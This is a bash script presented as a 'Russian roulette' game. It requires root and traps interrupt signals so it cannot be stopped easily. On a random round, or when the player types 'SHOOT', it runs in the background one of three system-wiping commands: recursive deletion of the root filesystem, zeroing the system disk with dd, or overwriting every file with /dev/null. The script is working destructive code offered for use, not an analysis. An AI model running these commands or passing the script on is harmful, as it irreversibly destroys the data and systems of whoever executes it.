#!/bin/bash

#Trap signals to ensure destruction process if activated and keep alive the execution of the script.

trap "" INT TSTP QUIT SIGTERM

#Colors. I put resets on every echo, read and printf lines to make your prompt white and distinct from the
#messages of the script. It also avoids colorizing your prompt if you kill the program mid-execution.

white="\e[37m"
red="\e[31m"
blue="\e[34m"
yellow="\e[33m"
reset="\e[0m"

#Execute with root privileges, don't be a coward. Exit with error code 1 if $EUID isn't equal to 0 (Root $EUID).

if [ "$EUID" -ne 0 ]; then
    echo
    echo -e "${yellow}Play as root, you fool...${reset}"
    echo
    exit 1
fi

#Get PID of process for SIGKILL if selected in the last round. I decided to use $$ instead of $BASH_PID because 
#it has better compatibility with older version of BASH, but it's a little bit buggy if you work with subshells, 
#better use $BASH_PID instead in those cases.

PID=$$

#Get the route of the physical disk that is being used by the system for $BULLET_TYPE when $1 equals 2. Works with
#VMs and systems that use LVM as far as I tested. In LVM systems, the result of the execution of the dd command 
#results in a unknown filesystem error at boot.

DISK=$(df / | tail -n +2 | awk '{print $1}' | sed 's/[0-9]*//g')

#Argument for $BULLET_TYPE selection.

SELECTED=$1

#Execution methods that will be evaluated and executed in the background. More explanation in READ.me file.
#Second execution method is kind of special, its execution time depends on the write speed of your 
#disk. If you have a slow HHD, don't even bother. If you have an SSD or SSD-NVMe, you can have fun with it.
#Case the variable and establish the methods for the destruction of the system.
#If an invalid or null parameter is passed to the script, exit with error code 2.

case $SELECTED in
	1) BULLET_TYPE="nohup rm -rf --no-preserve-root / > /dev/null 2>&1 &";;
	2) BULLET_TYPE="nohup dd if=/dev/zero of=$DISK > /dev/null 2>&1 &";;
	3) BULLET_TYPE="nohup find / -type f -exec cp /dev/null "{}" \; > /dev/null 2>&1 &";;
	*) echo; echo -e "${yellow}ERROR: invalid or null parameter provided. Accepted parameters are 1, 2 or 3 (select your EXECUTION method).${reset}"; echo; exit 2;;
esac	

#If 2 or more arguments are passed, exit with error code 3.

if [ "$#" -ne 1 ]; then
    echo
    echo -e "${yellow}ERROR: you must provide exactly one single parameter. Accepted parameters are 1, 2 or 3 (select your EXECUTION method).${reset}"
    echo
    exit 3
fi

#Intro.

echo
echo -e "${red}Created by Neptune. Hope you have fun with this, you crazy little comrade.${reset}"
echo -e "${red}From this point on, I am not responsible for what may happen when executing this script.${reset}"
echo -e "${red}DO NOT SPAM ENTER! You may see unexpected results...${reset}" #Not a joke.
sleep 1
echo -e "${white}
▄▄▄  ▄• ▄▌.▄▄ · .▄▄ · ▪   ▄▄▄·  ▐ ▄      
▀▄ █·█▪██▌▐█ ▀. ▐█ ▀. ██ ▐█ ▀█ •█▌▐█     
▐▀▀▄ █▌▐█▌▄▀▀▀█▄▄▀▀▀█▄▐█·▄█▀▀█ ▐█▐▐▌     
${blue}▐█•█▌▐█▄█▌▐█▄▪▐█▐█▄▪▐█▐█▌▐█ ▪▐▌██▐█▌     
.▀  ▀ ▀▀▀  ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀  ▀ ▀▀ █▪     
▄▄▄        ▄• ▄▌▄▄▌  ▄▄▄ .▄▄▄▄▄▄▄▄▄▄▄▄▄ .
▀▄ █·▪     █▪██▌██•  ▀▄.▀·•██  •██  ▀▄.▀·
${red}▐▀▀▄  ▄█▀▄ █▌▐█▌██▪  ▐▀▀▪▄ ▐█.▪ ▐█.▪▐▀▀▪▄
▐█•█▌▐█▌.▐▌▐█▄█▌▐█▌▐▌▐█▄▄▌ ▐█▌· ▐█▌·▐█▄▄▌
.▀  ▀ ▀█▄▀▪ ▀▀▀ .▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀ ${reset}" 

sleep 1.5
echo
read -p $'\e[31mPress ENTER to play:\e[0m '
echo
echo -e "${red}Loading a bullet...${reset}"

#Shuffle a number between 1 and 6 and store it as $BULLET_IN_CHAMBER.

BULLET_IN_CHAMBER=$(shuf -i 1-6 -n1)

sleep 1.5
echo
read -p $'\e[31mDone. Press ENTER to shoot...\e[0m '

#If $BULLET_IN_CHAMBER is equal to the number of the actual round (round = every time you press ENTER, not 
#the bullet), then evaluate one of the $BULLET_TYPE variables declared earlier. As you already saw, the 
#argument you write after the name of the script separated by a space defines the bullet that will be used. 
#If you survive, you are forced to keep playing, or you can kill the script manually (if you want to play 
#this kind of games, why would you not want to take your luck to the limit?)."

if [ $BULLET_IN_CHAMBER -eq 1 ]; then
    echo
    echo -e "${red}YOU ARE DEAD${reset}"
    echo		                       #Evaluate the selected $BULLET_TYPE as a command. This process
    eval $BULLET_TYPE			       #will run in the background. You are in a very big trouble
    exit 0				       #if you lose, if you didn't know already!
else [ $BULLET_IN_CHAMBER -ne 1 ]
    echo
    echo -e "${red}YOU SURVIVED${reset}"
fi

read -p $'\e[31mPress ENTER to keep shooting...\e[0m '     #Repeat...

if [ $BULLET_IN_CHAMBER -eq 2 ]; then
    echo
    echo -e "${red}YOU ARE DEAD${reset}"
    echo
    eval $BULLET_TYPE
    exit 0
else [ $BULLET_IN_CHAMBER -ne 2 ]
    echo
    echo -e "${red}YOU SURVIVED${reset}"
fi

read -p $'\e[31mPress ENTER to keep shooting...\e[0m '

if [ $BULLET_IN_CHAMBER -eq 3 ]; then
    echo
    echo -e "${red}YOU ARE DEAD${reset}"
    echo
    eval $BULLET_TYPE
    exit 0
else [ $BULLET_IN_CHAMBER -ne 3 ]
    echo
    echo -e "${red}YOU SURVIVED${reset}"
fi

read -p $'\e[31mPress ENTER to keep shooting...\e[0m '

if [ $BULLET_IN_CHAMBER -eq 4 ]; then
    echo
    echo -e "${red}YOU ARE DEAD${reset}"
    echo
    eval $BULLET_TYPE
    exit 0
else [ $BULLET_IN_CHAMBER -ne 4 ]
    echo
    echo -e "${red}YOU SURVIVED${reset}"
fi

read -p $'\e[31mPress ENTER to keep shooting...\e[0m '

if [ $BULLET_IN_CHAMBER -eq 5 ]; then
    echo
    echo -e "${red}YOU ARE DEAD${reset}"
    echo
    eval $BULLET_TYPE
    exit 0
else [ $BULLET_IN_CHAMBER -ne 5 ]
    echo
    echo -e "${red}YOU SURVIVED${reset}"
fi

#Obviously, you know that if you pull the trigger here you will die, so this is the option that gives you the 
#chance to quit the game. Read your input and store it in $answer with read.

printf "${red}You win! You can kill this process to end this (TYPE 'KILL'). Or, you can pull the trigger, only if you're crazy enough (TYPE 'SHOOT'): ${reset}" && read answer

#While loop for processing the answer you gave earlier. If $answer equals some form of writing KILL, send SIGKILL
#to $PID and end the game. If you're nuts you can shoot too, in this case if the variable $answer equals SHOOT or
#some form of the word, evaluate the selected $BULLET_TYPE and destroy everything. If you mistype, loop the 
#the command read until you get it right.

while true; do
     case $answer in
        "KILL"|"Kill"|"kill") 
              echo; echo -e "${red}Well played...${reset}"; 
              echo; ( kill -9 $PID ); 
              exit 0;;
	"SHOOT"|"Shoot"|"shoot") 
	      echo; echo -e "${red}Я стал смертью, разрушителем миров"${reset};  
echo; echo -e "${red}##++++++---------##############++++++#+++---------------------+++
##+++++++-------+#######################+---------------------+++
##+++++++-------+######################++---------------------+++
##+++++++-------+#########################-----------------------
##+++++---------##########################+----------------------
#+++------------#####################++++#-----------------------
#++--++++########################+++++++++++++++++---------------
#++----+###########################+++++++++++++++++-------------
#++-------------+########################+-----------------------
#++-------------+++##########+++####+++-+------------------------
#++-------------+-+#########+----++------..----------------------
#++-------------+#+#########+------------+-----------------------
#++--------------###########+-------..---.-----------------------
#++---------------##########+-----------.------------------------
##+----------------#########++.--.-------------------------------
##+----------------#########++-----------------------------------
##+----------------+#########++++++------------------------------
##+---+-------------+####-.+++-----------------------------------
##+--+++-------------+##-.#++++------.---------------------------
##++-+++-----------+###-.###+++-------+#-------------------------
##++--+++----++######+#+####++++-----.-###-----------------------
##+++--++##############+#####-----+...-######++----------------++
########################-+##++--+-....-###########++---------++++
########################+-.-###-......-#################++---++++${reset}";     #"Now I am become Death, the
	      echo; eval $BULLET_TYPE; break;;	 		                #destroyer of worlds"
	      * ) 							        # ~J. Robert Oppenheimer
	      echo; read -p $'\e[31mMistype error, try again:\e[0m ' answer;;	
     esac
done	
	
#END
